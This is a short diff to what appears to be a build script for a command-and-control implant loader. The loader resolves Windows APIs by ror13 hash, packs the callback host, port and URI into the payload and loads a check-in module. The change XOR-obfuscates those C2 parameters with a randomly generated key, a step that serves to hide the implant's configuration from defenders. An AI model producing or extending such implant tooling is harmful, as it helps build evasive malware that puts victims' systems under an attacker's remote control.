@@ -34,9 +34,19 @@ x64:
 	dfr "resolve" "ror13" "KERNEL32, NTDLL"
 	dfr "resolve_unloaded" "strings"
 	
-	# Patch in string parameters from the C2.
+	# Generate a random XOR key and patch it in.
+	generate $XORKEY 128
+	patch "XORKEY" $XORKEY
+	
+	# Marshal and obfuscate string parameters from the C2.
 	pack $RAW_PARAMS "zziiz" %PAYLOAD_UUID %CALLBACK_HOST %CALLBACK_PORT %CALLBACK_HTTPS %CALLBACK_URI
-	patch "RAW_PARAMS" $RAW_PARAMS
+	
+	push $RAW_PARAMS
+	xor $XORKEY
+	pop $ENC_PARAMS
+	
+	# Patch in obfuscated string parameters from the C2.
+	patch "ENC_PARAMS" $ENC_PARAMS
 	
 	# Load built-in PICOs.
 	load "bin/pico_checkin.o"
